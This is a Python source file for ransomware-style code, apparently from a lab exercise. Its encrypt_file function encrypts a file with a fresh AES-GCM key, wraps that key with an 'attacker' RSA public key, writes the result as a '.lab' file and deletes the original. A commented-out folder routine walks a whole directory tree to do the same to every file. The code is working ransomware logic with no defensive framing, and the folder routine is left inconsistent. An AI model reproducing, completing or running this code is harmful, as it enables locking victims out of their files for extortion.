from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os


def encrypt_file(filepath):
    # The commented part is just the actual hybrid encryption algorithm
    # We already assume that the attacker has already generated their key pair

    # Generate the attacker's private key
    # attacker_private_key = rsa.generate_private_key(
    #    public_exponent=65537, key_size=2048
    # )
    # attacker_public_key = attacker_private_key.public_key()
    # with open("attacker_private_key.pem", "wb") as file:
    #    file.write(
    #        attacker_private_key.private_bytes(
    #            encoding=serialization.Encoding.PEM,
    #            format=serialization.PrivateFormat.PKCS8,
    #            encryption_algorithm=serialization.NoEncryption(),
    #        )
    #    )
    # with open("attacker_public_key.pem", "wb") as file:
    #    file.write(
    #        attacker_public_key.public_bytes(
    #            encoding=serialization.Encoding.PEM,
    #            format=serialization.PublicFormat.SubjectPublicKeyInfo,
    #        )
    #    )

    if filepath.endswith(".lab"):
        return  # Ignore already ransomware encrypted files

    with open("attacker_public_key.pem", "rb") as file:
        attacker_public_key = serialization.load_pem_public_key(file.read())

    aes_key = AESGCM.generate_key(bit_length=256)
    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)

    print("Nonce: ", nonce)
    print("AES Key: ", aes_key)

    # with open("aes_key.txt", "wb") as file:
    #    file.write(aes_key)

    with open(filepath, "rb") as file:
        plaintext = file.read()

    ciphertext = aesgcm.encrypt(nonce, plaintext, None)

    # Encrypt the AES key
    encrypted_aes_key = attacker_public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

    output_file = os.path.join(filepath + ".lab")
    with open(output_file, "wb") as f:
        f.write(len(encrypted_aes_key).to_bytes(4, "big"))
        f.write(encrypted_aes_key)
        f.write(nonce)
        f.write(ciphertext)

    print("Removing:", filepath, "\n")
    os.remove(filepath)


"""
def encrypt_folder(folder_path):

    #os.makedirs(folder_path, exist_ok=True)
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            filepath = os.path.join(root, file)
            print("Encrypting:", filepath)
            encrypted_aes_key, nonce, ciphertext = encrypt_file(filepath)
            output_file = os.path.join(folder_path, file + ".lab")

            with open(output_file, "wb") as f:
                f.write(len(encrypted_aes_key).to_bytes(4, "big"))
                f.write(encrypted_aes_key)
                f.write(nonce)
                f.write(ciphertext)

            os.remove(filepath)
"""
